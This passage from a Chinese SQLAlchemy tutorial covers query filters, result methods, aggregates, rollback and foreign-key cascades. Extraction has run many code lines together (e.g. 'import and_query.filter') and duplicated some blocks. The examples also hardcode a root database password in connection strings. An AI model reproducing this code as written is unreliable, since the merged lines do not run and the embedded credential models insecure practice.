&#39;jack&#39;)</code></td><td></td></tr><tr><td><code>!=</code></td><td><code>!=</code></td><td><code>query.filter(user.name != &#39;jack&#39;)</code></td><td></td></tr><tr><td><code>&gt;,&lt;</code></td><td><code>&gt;,&lt;</code></td><td><code>query.filter(user.id&gt;3)</code></td><td></td></tr><tr><td><code>like</code></td><td><code>like</code></td><td><code>query.filter(user.name.like(&#39;%Jack&#39;))</code></td><td>区分大小写</td></tr><tr><td></td><td><code>ilike</code></td><td><code>query.filter(user.name.ilike(&#39;%Jack&#39;))</code></td><td>不区分大小写</td></tr><tr><td><code>in</code></td><td><code>in_</code></td><td><code>query.filter(user.name.in_([&#39;A&#39;,&#39;B&#39;]))</code></td><td><code>in_(列表)</code></td></tr><tr><td><code>not in</code></td><td><code>~ in_</code></td><td><code>query.filter(~ user.name.in_([&#39;A&#39;,&#39;B&#39;]))</code></td><td><code>~</code>取反</td></tr><tr><td><code>is null</code></td><td><code>== None</code></td><td><code>query.filter(user.name == None)</code></td><td></td></tr><tr><td><code>not null</code></td><td><code>!=None</code></td><td><code>query.filter(user.name !=None)</code></td><td></td></tr><tr><td><code>and</code></td><td><code>and_</code></td><td><code>form sqlalchemy import and_</code></td><td></td></tr><tr><td><code>or</code></td><td><code>or_</code></td><td><code>from sqlalchemy import or_</code></td><td></td></tr><tr><td><code>match</code></td><td><code>match</code></td><td><code>query.filter(user.name.match(&#39;A&#39;))</code></td><td></td></tr></tbody></table><ul><li><code>in_</code>讲解</li></ul><pre class="line-numbers language-python"><code class="language-python">query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">.</span>in_<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ed'</span><span class="token punctuation">,</span> <span class="token string">'wendy'</span><span class="token punctuation">,</span> <span class="token string">'jack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 叠加使用</span>query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">.</span>in_<span class="token punctuation">(</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">.</span>like<span class="token punctuation">(</span><span class="token string">'%ed%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># use tuple_() for composite (multi-column) queries</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> tuple_query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>tuple_<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">,</span> User<span class="token punctuation">.</span>nickname<span class="token punctuation">)</span><span class="token punctuation">.</span>\in_<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'ed'</span><span class="token punctuation">,</span> <span class="token string">'edsnickname'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'wendy'</span><span class="token punctuation">,</span> <span class="token string">'windy'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># not in </span><span class="token comment" spellcheck="true"># 使用~取反</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>and_</code> 讲解</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># use and_()</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> and_query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>and_<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">'ed'</span><span class="token punctuation">,</span> User<span class="token punctuation">.</span>fullname <span class="token operator">==</span> <span class="token string">'Ed Jones'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 可以不写and, 某人逗号隔开,表示并列</span>query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">'ed'</span><span class="token punctuation">,</span> User<span class="token punctuation">.</span>fullname <span class="token operator">==</span> <span class="token string">'Ed Jones'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 多个filter表示,并列关系</span>query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">'ed'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>fullname <span class="token operator">==</span> <span class="token string">'Ed Jones'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>or_</code> 讲解</li></ul><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 使用 or_  包裹变量</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> or_query<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>or_<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">'ed'</span><span class="token punctuation">,</span> User<span class="token punctuation">.</span>name <span class="token operator">==</span> <span class="token string">'wendy'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>等等</p></blockquote><h5 id="3-查询返回的列表-多个实例-以及标量-一个实例"><a href="#3-查询返回的列表-多个实例-以及标量-一个实例" class="headerlink" title="3.查询返回的列表(多个实例)以及标量(一个实例)"></a>3.查询返回的列表(多个实例)以及标量(一个实例)</h5><blockquote><p>包含一些<code>SQL</code>语句<code>where</code>字句后的判断条件<code>order by</code> ,<code>count</code>,<code>limit</code> 等</p><p>注意:<code>get(indet)</code> :<code>indet</code>用来指定主键的值,可以是一个列表,如<code>[5,7]</code>.它的返回对象是一个实例,也就是<code>select</code>查询后的实例,而其他执行<code>query().filter()</code>返回的是一个可迭代对象,需要去迭代其中的实例.</p><table><thead><tr><th>方法,属性</th><th>说明</th></tr></thead><tbody><tr><td><code>all()</code></td><td>返回一个列表,根据主键对列表条目进行删除,如果有2个主键相同,只保留一行,不适用于查询各个列的情况</td></tr><tr><td><code>get(key)</code></td><td>返回指定主键的行</td></tr><tr><td><code>one()</code></td><td>完全匹配所有的行,如果返回的结果是多行,或者没有匹配到,报错</td></tr><tr><td><code>one_or_none</code></td><td>和<code>one()</code>相同,匹配不到,返回None,匹配多行,报错</td></tr><tr><td><code>first()</code></td><td>对查询结果进行了一个限制-返回列表的第一个值</td></tr><tr><td><code>scalar()</code></td><td>援引自<code>one()</code>函数,查询成功之后会返回这一行的第一列的参数</td></tr><tr><td><code>count()</code></td><td>计数,计算一个数据出现的次数</td></tr><tr><td><code>limit(n)</code></td><td>返回<code>n</code>个数据</td></tr><tr><td><code>distinct()</code></td><td>不重复</td></tr><tr><td><code>order_by()</code></td><td>排序</td></tr><tr><td><code>add_columns()</code></td><td>添加查询列</td></tr><tr><td><code>offset(n)</code></td><td>偏移<code>n</code> 个数据后开始查询数据</td></tr><tr><td><code>slice(start, stop)</code></td><td>切片操作,查询中间的数据</td></tr><tr><td>`query()[start, stop]</td><td>实现和切片<code>slice</code>同样的操作</td></tr></tbody></table></blockquote><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># all()</span><span class="token comment" spellcheck="true"># 返回一个列表,根据主键对列表条目进行删除,如果有2个主键相同,只保留一行,不适用于查询各个列的情况</span><span class="token comment" spellcheck="true"># 比如 id=7 有两行数据,只能保留一行</span>query_all <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">.</span>ilike<span class="token punctuation">(</span><span class="token string">'t%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>query_all<span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>query_first <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">.</span>ilike<span class="token punctuation">(</span><span class="token string">'t%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>query_first<span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>query_one <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>name<span class="token punctuation">.</span>ilike<span class="token punctuation">(</span><span class="token string">'t%'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>query_one<span class="token punctuation">.</span>one<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>limit_obj <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>order_by<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span>limit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>limit_obj<span class="token punctuation">.</span>all<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># add.columns 实例</span><span class="token comment" spellcheck="true">## add_columns</span>aaa <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>id <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>add_column<span class="token punctuation">(</span>Column<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>aaa<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT `Users`.id AS `Users_id`, name FROM `Users` WHERE `Users`.id > %(id_1)s"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h5 id="4-聚合查询"><a href="#4-聚合查询" class="headerlink" title="4.聚合查询"></a>4.聚合查询</h5><blockquote><p><code>mysql</code>聚合函数:<code>max,min,sum,count</code></p><p>使用聚合查询时,需要导入相关的模块</p><pre class="line-numbers language-python">from sqlalchemy import func</code></pre><p>可以构造一个<code>book</code> 表.表中存放书籍的价格,如下:</p><pre><code class="python"><code class="language-python">from sqlalchemy import func</code></pre><p>可以构造一个<code>book</code> 表.表中存放书籍的价格,如下:</p><pre><code class="python">from sqlalchemy import create_enginefrom sqlalchemy import Column,Integer,Stringfrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import sessionmakerfrom sqlalchemy import funcimport random# 1.创建Engineconnect_msg = 'mysql+pymysql://root:2008.Cn123@192.168.0.101/test'engine=create_engine(connect_msg)# 2.创建 SessionSession = sessionmaker(bind=engine)session = Session()# 3.创建基类Base = declarative_base()# 4.Modelclass Book(Base):__tablename__ = 'book'id = Column(Integer,primary_key=True)price = Column(Integer)Base.metadata.create_all(engine)session.add_all([Book(id=1, price=random.randint(1,256)),Book(id=2, price=random.randint(1,256)),Book(id=3, price=random.randint(1,256)),Book(id=4, price=random.randint(1,256)),Book(id=5, price=random.randint(1,256)),Book(id=6, price=random.randint(1,256))])session.commit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后利用<code>func</code> 函数的特性,使用聚合函数查询</p><pre class="line-numbers language-python"><code class="language-python">q1 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>func<span class="token punctuation">.</span>min<span class="token punctuation">(</span>Book<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q1<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT min(book.price) AS min_1 FROM book"""</span>q2 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>func<span class="token punctuation">.</span>max<span class="token punctuation">(</span>Book<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q2<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT max(book.price) AS max_1 FROM book"""</span><span class="token comment" spellcheck="true"># id 列一定是不重复的,可以根据id列查询一共有多少行数据</span>q3 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>func<span class="token punctuation">.</span>count<span class="token punctuation">(</span>Book<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q3<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT count(book.id) AS count_1 FROM book"""</span>q4 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>func<span class="token punctuation">.</span>sum<span class="token punctuation">(</span>Book<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q4<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT sum(book.price) AS sum_1 FROM book"""</span>q5 <span class="token operator">=</span> session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>func<span class="token punctuation">.</span>avg<span class="token punctuation">(</span>Book<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>q5<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""SELECT avg(book.price) AS avg_1 FROM book"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="9-事务回滚"><a href="#9-事务回滚" class="headerlink" title="9.事务回滚"></a>9.事务回滚</h3><blockquote><p>会话<code>session</code> 主要是用来处理与数据库相关的连接的.那么<code>session</code> 也应该能处理基本的事务回滚.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 添加一个新事物对象</span>fake_name <span class="token operator">=</span> User<span class="token punctuation">(</span>id<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'fakename'</span><span class="token punctuation">,</span> fullname<span class="token operator">=</span><span class="token string">'fakename H'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>fake_name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>添加完毕后,可以通过<code>query</code>来<code>flush</code>数据库中</p><pre class="line-numbers language-python">q9 = session.query(User).filter(User.name == &#39;fakename&#39;).all()</code></pre><p>可以查看<code>fake_name</code>这个实例是在<code>session</code>中的,而且没有提交</p><pre><code class="python"><code class="language-python">q9 = session.query(User).filter(User.name == &#39;fakename&#39;).all()</code></pre><p>可以查看<code>fake_name</code>这个实例是在<code>session</code>中的,而且没有提交</p><pre><code class="python">fake_name in session# True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行回滚</p><pre class="line-numbers language-python">session.rollback()</code></pre><p>再次查看<code>fake_name</code>这个实例</p><pre><code class="python"><code class="language-python">session.rollback()</code></pre><p>再次查看<code>fake_name</code>这个实例</p><pre><code class="python">fake_name in session# False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看<code>mysql</code>的查询日志</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">tail</span> -10  /mysql_data/localhost.log<span class="token punctuation">..</span>.2020-08-23T10:51:42.946715Z        7 Query    INSERT INTO <span class="token function">users</span> <span class="token punctuation">(</span>id, name, fullname, password<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span>5, <span class="token string">'fakename'</span>, <span class="token string">'fakename H'</span>, <span class="token string">'123'</span><span class="token punctuation">)</span>2020-08-23T10:51:42.948944Z        7 Query    SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM <span class="token function">users</span> WHERE users.name <span class="token operator">=</span> <span class="token string">'fakename'</span>2020-08-23T10:52:24.595121Z        7 Query    ROLLBACK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到明显的<code>ROLLBACK</code>,回滚操作.</p></blockquote><h3 id="10-外键约束"><a href="#10-外键约束" class="headerlink" title="10.外键约束"></a>10.外键约束</h3><blockquote><p>在<code>SQL</code> 语句中,外键约束基于两种</p><ul><li>基于表的外键约束.</li><li>基于列的外键约束.</li></ul><p>在<code>SQLAlchemy</code> 中,可以实现基于数据库的外键约束</p><ul><li>基于表的外键约束.</li><li>基于列的外键约束.</li></ul><p>但是<code>SQLAlchemy</code> 作为<code>ORM</code> ,在实现了数据库级别的外键约束后,并不能实现在<code>ORM</code> 层面的外键约束.<a href="https://docs.sqlalchemy.org/en/13/orm/relationship_api.html?highlight=relationship#sqlalchemy.orm.relationship.params.cascade" target="_blank" rel="noopener">查看这里</a><a href="https://docs.sqlalchemy.org/en/13/orm/cascades.html?highlight=cascade" target="_blank" rel="noopener">级联</a></p><pre class="line-numbers language-python"><code class="language-python">help<span class="token punctuation">(</span>ForiegnKey<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>ptional string<span class="token punctuation">.</span> If set<span class="token punctuation">,</span> emit ON DELETE <span class="token operator">&lt;</span>value<span class="token operator">></span> when  issuing DDL <span class="token keyword">for</span> this constraint<span class="token punctuation">.</span> Typical values include CASCADE<span class="token punctuation">,</span>DELETE <span class="token operator">and</span> RESTRICT<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>help<span class="token punctuation">(</span>relationship<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>comma<span class="token operator">-</span>separated list of cascade rules which determines how Session operations should be “cascaded” <span class="token keyword">from</span> parent to child<span class="token punctuation">.</span> This defaults to <span class="token boolean">False</span><span class="token punctuation">,</span> which means the default cascade should be used <span class="token operator">-</span> this default cascade <span class="token keyword">is</span> <span class="token string">"save-update, merge"</span><span class="token punctuation">.</span>The available cascades are save<span class="token operator">-</span>update<span class="token punctuation">,</span> merge<span class="token punctuation">,</span> expunge<span class="token punctuation">,</span> delete<span class="token punctuation">,</span> delete<span class="token operator">-</span>orphan<span class="token punctuation">,</span> <span class="token operator">and</span> refresh<span class="token operator">-</span>expire<span class="token punctuation">.</span> An additional option<span class="token punctuation">,</span> all indicates shorthand <span class="token keyword">for</span> <span class="token string">"save-update, merge, refresh-expire, expunge, delete"</span><span class="token punctuation">,</span> <span class="token operator">and</span> <span class="token keyword">is</span> often used <span class="token keyword">as</span> <span class="token keyword">in</span> <span class="token string">"all, delete-orphan"</span> to indicate that related objects should follow along <span class="token keyword">with</span> the parent object <span class="token keyword">in</span> all cases<span class="token punctuation">,</span> <span class="token operator">and</span> be deleted when de<span class="token operator">-</span>associated<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所谓不能实现在<code>ORM</code>中,指的是虽然在<code>MySQL</code> 客户端上,<code>DDL</code> 语句操作实现了外键约束,但是在<code>python</code> 中使用<code>SQLAlchemy</code> 语句仍然能删除数据中记录,并设置为<code>NULL</code> ,原因就是<code>relationship</code> 的<code>cascade</code> 默认是<code>save-update, merge</code>.把它设置成<code>all, delete-orphan</code>之后,就可以产生级联删除,而不是设置成<code>NONE</code>.</p><hr><p>讨论基于列的外键约束,基于表的外键约束同理,写法相同.</p><p>有以下表结构:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/10222.png" alt="10222"></p><p>对应的<code>SQL</code>语句如下:</p><pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 类别表</span><span class="token keyword">create</span> <span class="token keyword">table</span> categoryes<span class="token punctuation">(</span>    c_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    c_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    c_description  <span class="token keyword">text</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span><span class="token operator">=</span>utf8 <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">"类别表"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 商家表</span><span class="token keyword">create</span> <span class="token keyword">table</span> vendors<span class="token punctuation">(</span>    v_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    v_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>v_id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">default</span> char <span class="token keyword">set</span> utf8 <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">'供应商'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">-- 产品表</span><span class="token keyword">create</span> <span class="token keyword">table</span> products<span class="token punctuation">(</span>    p_id <span class="token keyword">int</span> <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>    p_name <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    p_price <span class="token keyword">decimal</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    c_id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    v_id <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">not</span> <span class="token boolean">null</span><span class="token punctuation">,</span>    <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>p_id<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> fk_products_categoryes    <span class="token keyword">foreign</span> <span class="token keyword">key</span><span class="token punctuation">(</span>c_id<span class="token punctuation">)</span>    <span class="token keyword">references</span> categoryes<span class="token punctuation">(</span>c_id<span class="token punctuation">)</span>    <span class="token keyword">on</span> <span class="token keyword">delete</span> <span class="token keyword">set</span> <span class="token boolean">null</span>    <span class="token keyword">on</span> <span class="token keyword">update</span> <span class="token keyword">cascade</span><span class="token punctuation">,</span>    <span class="token keyword">constraint</span> fk_products_vendors    <span class="token keyword">foreign</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>v_id<span class="token punctuation">)</span>    <span class="token keyword">references</span> vendors<span class="token punctuation">(</span>v_id<span class="token punctuation">)</span>    <span class="token keyword">on</span> <span class="token keyword">delete</span> <span class="token keyword">no</span> <span class="token keyword">action</span>    <span class="token keyword">on</span> <span class="token keyword">update</span> <span class="token keyword">cascade</span><span class="token punctuation">)</span><span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">3</span> <span class="token keyword">default</span> char <span class="token keyword">set</span><span class="token operator">=</span>utf8 <span class="token keyword">comment</span><span class="token operator">=</span><span class="token string">"产品表"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>python</code>创建如下:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env/python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> create_engine<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> sessionmaker<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>ext<span class="token punctuation">.</span>declarative <span class="token keyword">import</span> declarative_base<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> Column<span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> Time<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Enum<span class="token punctuation">,</span> DECIMAL<span class="token punctuation">,</span> ForeignKey<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span>  relationship<span class="token keyword">from</span> sqlalchemy <span class="token keyword">import</span> and_<span class="token comment" spellcheck="true"># 1.连接数据库</span>engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span><span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/sqlalchemy'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 2.创建Session</span>Session <span class="token operator">=</span> sessionmaker<span class="token punctuation">(</span>bind<span class="token operator">=</span>engine<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 3.实例化session</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 4.创建Model</span><span class="token comment" spellcheck="true"># 创建基类</span>Base <span class="token operator">=</span> declarative_base<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 创建映射</span><span class="token keyword">class</span> <span class="token class-name">Categoryes</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'categoryes'</span>    c_id <span class="token operator">=</span> Column<span class="token punctuation">(</span>Integer<span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    c_name <span class="token operator">=</span> Column<span class="token punctuation">(</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    c_description <span class="token operator">=</span> Column<span class="token punctuation">(</span>Text<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 设置双向关系,指定的是类方法</span>    products <span class="token operator">=</span> relationship<span class="token punctuation">(</span><span class="token string">'Products'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'categoryes'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Vendors</span><span class="token punctuation">(</span>Base<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> 